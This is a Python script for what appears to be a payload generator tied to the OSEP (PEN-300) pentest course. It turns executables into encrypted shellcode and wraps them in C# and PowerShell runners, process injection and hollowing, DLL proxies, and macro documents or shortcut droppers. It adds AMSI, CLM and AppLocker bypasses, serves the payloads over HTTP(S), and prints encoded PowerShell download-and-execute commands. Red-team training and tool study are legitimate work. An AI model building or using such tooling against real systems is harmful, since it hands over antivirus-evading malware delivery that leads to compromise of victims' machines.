import os
import argparse
import tempfile
import shutil

from tradecraft import c, cs, ps, vba, lnk
from tradecraft.utils import *

from urllib.parse import urlparse

rootdir = os.path.dirname(__file__)

def argparser():
    containers_ext = ['.doc', '.docm', '.hta', '.js', '.lnk']
    input_ext = ['', '.raw', '.bin', '.txt', '.exe', '.dll']
    output_ext = ['', '.elf', '.exe', '.dll', '.ps1', '.ps'] + containers_ext

    parser = argparse.ArgumentParser(description='Tradcrafts automation for Offensive Security PEN-300 (OSEP)', formatter_class=ArgumentFormatter)
    
    methods = parser.add_mutually_exclusive_group(required=True)
    
    parser.add_argument('-i', '--input', required=True, help=f'input file format: ({', '.join(input_ext[1:])})')
    parser.add_argument('-o', '--output', required=True, help=f'output file format: ({', '.join(output_ext[1:])})')
    parser.add_argument('-s', '--server', type=urlparse, help='stage the payload')
    parser.add_argument('-c', '--class', dest='_class', help='class name (required for .NET DLL)')
    parser.add_argument('-m', '--method', help='method for DLL. (required for .NET DLL)')
    parser.add_argument('-a', '--args', nargs='+', help='payload arguments')
    
    methods.add_argument('--run', action='store_true', help='shellcode runner {cs, ps1, c}') 
    
    methods.add_argument('--inject', action='store_true', help='shellcode process injector {cs, ps1}')
    methods.add_argument('--hollow', action='store_true', help='shellcode process hollowing {cs}') 
    parser.add_argument('--process', default='explorer.exe', help='target process')

    parser.add_argument('--proxy', action='store_true', help='dll proxying {c}')
    parser.add_argument('--dll', help='path to the DLL to generate a proxy for')
    parser.add_argument('--dll-path', metavar='PATH', default='C:\\Windows\\System32', help='path to original path')

    parser.add_argument('--reflection', action='store_true', help='assembly reflection {cs, ps1}')
    parser.add_argument('--amsi', action='store_true', help='amsi patch {cs, ps1}')
    parser.add_argument('--clm', action='store_true', help='clm bypass')

    parser.add_argument('--applocker', nargs='?', choices=['msbuild', 'workflow_compiler', 'installutil'], type=str.lower, const='msbuild', help='applocker bypass {cs}')
    parser.add_argument('--applocker-path', metavar='PATH', default='C:\\Windows\\Tasks', help='applocker bypass {cs}')

    parser.add_argument('--platform', choices=['windows', 'linux'], type=str.lower, default='windows', help='payload platform')
    parser.add_argument('--arch', choices=['x32', 'x64', 'any'], type=str.lower, default='any', help='payload architecture')
    
    parser.add_argument('--delay', type=int, default=0, help='delay payload execution')
    parser.add_argument('-e', '--encrypt', choices=[None, 'AES', 'XOR', 'ROT'], default='AES', type=lambda v: None if v.lower() == 'none' else v.upper(), help='encrypt the payload')
    parser.add_argument('--hide', help='hide windows console', action='store_true')

    parser.add_argument('--doc', choices=['shell', 'wmi'], default='shell', type=str.lower, help='doc execution method')

    parser.add_argument('-v', '--verbose', help='verbose output', action='count')
    parser.add_argument('-q', '--quiet', help='hide banner', action='store_true')

    args = parser.parse_args()

    if os.path.splitext(args.input)[1] not in input_ext:
        parser.error('supported input extensions: ' + ', '.join(input_ext[1:]))
    
    if os.path.splitext(args.output)[1] not in output_ext:
        parser.error('supported output extensions : ' + ', '.join(output_ext[1:]))
    
    if args.platform == 'linux' and not args.run:
        parser.error('supported platform: windows extensions')

    if os.path.splitext(args.output)[1] in ['.ps1', '.ps'] and not args.run and not args.inject:
        parser.error('output extension not supported')

    if args.reflection and not args.server:
        parser.error('assembly reflection requires server option')

    if args.applocker and not args.server:
        parser.error('applocker bypass requires server option')

    if args.proxy and not args.server:
        parser.error('dll proxy requires server option')
    
    if args.proxy and not args.server:
        parser.error('dll proxy requires server option')
    
    if args.proxy and not args.dll:
        parser.error('dll proxy requires dll option')

    if not args.quiet:
        print_banner()

    return args

def donut(input, output, arch='any', amsi=True, _class=None, method=None, verbose=False):
    arch = arch.lower().replace('x32', 'x86').replace('x64', 'amd64').replace('any', 'x86+amd64')
    command = [os.path.join(rootdir, 'tradecraft/bin/donut'), '--arch:'+arch, '--input:'+input, '--output:'+output]
    if os.path.splitext(input)[1] == '.dll' and _class and method:
        command.append('--class:'+_class)
        command.append('--method:'+method)
    build(command, verbose)

def mcs(input, output, arch='any', links=[], delay=None, encrypt=None, hide=None, verbose=False):
    arch = arch.lower().replace('x32', 'x86').replace('any', 'anycpu')
    command = ['mcs', '-unsafe', '-platform:'+arch, input, '-out:'+output]# '-sdk:4.5'
    if links:
        command.append(' '.join('-r:'+link for link in links))
    defines = []
    if delay:
        defines.append('DELAY')
    if encrypt:
        defines.append(encrypt.upper())
    
    if defines:
        command.append('-define:'+';'.join(defines))

    if os.path.splitext(output)[1] == '.dll':
        command.append('-target:library')
    if hide:
        command.append('-target:winexe')

    print_info('Building payload')
    build(command, verbose)

def mingw(input, output, defines=None, verbose=False):
    mingw = ['x86_64-w64-mingw32-gcc', input, ' '.join(defines), '-o', output]
    if os.path.splitext(output)[1] == '.dll':
        mingw.append('-shared')
    build(mingw, verbose)

def encrypt(enc, shellcode, key=None, iv=None):
    if enc:
        if enc.upper() == 'AES':
            if not key:
                key = os.urandom(16)
                iv = os.urandom(16)
            shellcode = aes_encrypt(shellcode, key, iv)
        elif enc.upper() == 'XOR':
            if not key:
                key = int.from_bytes(os.urandom(1))
            shellcode = xor_encrypt(shellcode, key)
        elif enc.upper() == 'ROT':
            if not key:
                key = int.from_bytes(os.urandom(1))
            shellcode = rot_encrypt(shellcode, key)
    return shellcode, key, iv

def main():
    args = argparser()

    input_ext = os.path.splitext(args.input)[1]
    output_ext = os.path.splitext(args.output)[1]

    temp = tempfile.TemporaryDirectory()
    tempdir = temp.name

    output_basename = os.path.basename(args.output)
    output = os.path.join(tempdir, output_basename)
    target = output

    containers_ext = ['.doc', '.docm', '.hta', '.js', '.lnk']

    if (output_ext in containers_ext):
        target = target.replace(output_ext, '.exe')
    target_basename = os.path.basename(target)
    target_path = os.path.splitext(target)[0]
    target_name = os.path.basename(target_path)
    
    shellcode_arch = args.arch

    if input_ext in ['', '.bin', '.raw', '.txt']:
        input_file = args.input

    elif input_ext in ['.exe', '.dll']:
        print_info('Generating shellcode using donut')
        shellcode_arch = get_arch(args.input)
        donut(args.input, os.path.join(tempdir, 'shellcode.bin'), args.arch, args.amsi, args._class, args.method, args.verbose)
        
        input_file = os.path.join(tempdir, 'shellcode.bin')
    
    with open(input_file, 'rb') as f:
        shellcode = f.read()
    
    shellcode, key, iv = encrypt(args.encrypt, shellcode)
    
    if args.server:
        scheme = args.server.scheme if args.server.scheme in ['http', 'https'] else 'http'
        hostname = args.server.hostname
        port = args.server.port if args.server.port else 80 if scheme == 'http' else 443
        certfile = os.path.join(rootdir, 'tradecraft/ssl/cert.pem') if scheme == 'https' else None
        keyfile = os.path.join(rootdir, 'tradecraft/ssl/key.pem') if scheme == 'https' else None
        httpd = HTTPServer(hostname, port, tempdir, certfile, keyfile)
        url = f'{scheme}://{hostname}:{port}'

        if args.reflection or args.applocker:
            code = cs.stager(url+'/'+target_name+'.bin', args.encrypt, key, iv)
            
            with open(target_path+'.bin', 'wb') as f:
                f.write(shellcode)

            with open(target_path+'.cs', 'w') as f:
                f.write(code)

            print_info('Building stager payload')
            mcs(target_path+'.cs', target_path+'.exe', arch=args.arch, delay=args.delay, encrypt=args.encrypt, hide=args.hide, verbose=args.verbose)
            donut(target_path+'.exe', os.path.join(tempdir, 'shellcode.bin'), arch=args.arch, amsi=args.amsi, verbose=args.verbose)
            print_success('Payload stager generated')

            with open(os.path.join(tempdir, 'shellcode.bin'), 'rb') as f:
                shellcode = f.read()
            
            shellcode, key, iv  = encrypt(args.encrypt, shellcode, key, iv)

    if output_ext in ['.exe', '.dll'] + containers_ext:
        if args.run:
            print_info('Generating shellcode runner payload')
            code = cs.shellcode_runner(shellcode, args.encrypt, key, iv, args.delay)
        elif args.inject:
            print_info('Generating process injection payload')
            code = cs.process_injection(shellcode, args.encrypt, key, iv, args.delay, args.process, shellcode_arch)
        elif args.hollow:
            print_info('Generating process hollowing payload')
            code = cs.process_hollowing(shellcode, args.encrypt, key, iv, args.delay, args.process, shellcode_arch)
        
        with open(os.path.join(tempdir,'program.cs'), 'w') as f:
            f.write(code)
        
        mcs(os.path.join(tempdir,'program.cs'), target, arch=args.arch, delay=args.delay, encrypt=args.encrypt, hide=args.hide, verbose=args.verbose)
        print_success('Payload generated')
        
    elif output_ext in ['.ps1', '.ps']:
        if args.run:
            print_info('Generating shellcode runner payload')
            code = ps.shellcode_runner(shellcode, args.encrypt, key, iv, args.delay, args.amsi)
        elif args.inject:
            print_info(f'Generating process injection payload')
            code = ps.process_injection(shellcode, args.encrypt, key, iv, args.delay, args.amsi, args.process)
        
        with open(target, 'w') as f:
            f.write(code)
        print_success('Payload generated')
        
    if args.server:
        if output_ext in ['.exe', '.dll'] + containers_ext:
            if args.reflection or args.applocker:
                arch = '' if shellcode_arch == 'x32' else '64'
                if args.applocker:
                    print_info(f'Generating {args.applocker} payload')
                    cs_code, xml_code = cs.applocker_bypass(args.applocker, args.applocker_path, target_name, url+'/'+target_basename)
                    ps_code = ps.applocker_bypass(args.applocker, url, args.applocker_path, target_name, arch, args.amsi, args.clm)

                    if xml_code:
                        with open(target_path+'.xml', 'w') as f:
                            f.write(xml_code)
                    if cs_code:
                        with open(target_path+'.cs', 'w') as f:
                            f.write(cs_code)
                        
                    if args.applocker == 'installutil':  
                        mcs(target_path+'.cs', target_path+'.txt', links=['System.Configuration.Install.dll'], arch=args.arch, delay=args.delay, hide=args.hide, verbose=False)

                elif args.reflection:
                    ps_code = ps.assembly_reflection(url+'/'+target_basename, args.amsi, args.clm)
                
                with open(target_path+'.ps1', 'w') as f:
                        f.write(ps_code.strip())
                
                #ps_command = f'(New-Object System.Net.WebClient).DownloadString("{url}/{target_basename}") | IEX'
                ps_command = f'IRM {url}/{target_name}.ps1 | IEX'
                
                if output_ext in ['.doc', '.docm']:
                    if output_ext == '.doc':
                        doc_file = vba.doc(ps_command, args.doc)
                    elif output_ext == '.docm':
                        doc_file = vba.docm(ps_command, args.doc)
                    with open(output, 'wb') as f:
                        f.write(doc_file)
                    ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{output_basename}", "{output_basename}");'
                elif output_ext in ['.hta', '.js', '.lnk']:
                    lnk.shortcut('powershell', ps_command, output)

            elif output_ext == '.exe':
                ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_basename}", "{target_basename}"); .\\{target_basename}'   
            else:
                ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_basename}", "{target_basename}.")'    

        elif output_ext in ['.ps1', '.ps']:
            print_info('Generating powershell payload')
            ps_command = ps.amsi if args.amsi and not args.clm else ''
            ps_command += f'IRM {url}/{target_basename} | IEX'
        
        else:
            ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_basename}", "{target_basename}")'

        if args.proxy:
            dll_name = os.path.basename(args.dll)
            dll_code, def_code = c.dll_proxy(args.dll, args.dll_path, f'cmd.exe /c powershell -ep bypass -enc {ps_encode(ps_command)}')

            with open(os.path.join(tempdir,'proxy.c'), 'w') as f:
                f.write(dll_code)
            
            with open(os.path.join(tempdir,'proxy.def'), 'w') as f:
                f.write(def_code)

            print_info('Generating dll proxying payload')
            mingw(os.path.join(tempdir,'proxy.c'), os.path.join(tempdir,dll_name), defines=[os.path.join(tempdir,'proxy.def')], verbose=args.verbose)
            print_success('Payload generated')
            
            ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{dll_name}", "{dll_name}.")'    

        if args.verbose:
            print_debug('powershell command')
            print(ps_command)
        
        print(f'powershell.exe -enc {ps_encode(ps_command)}')
        
        shutil.copy(output, args.output) 
        httpd.serve_forever()
    else:
        shutil.copy(output, args.output) 

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print_warn('Build failed:')
        print_error(str(e))
        raise e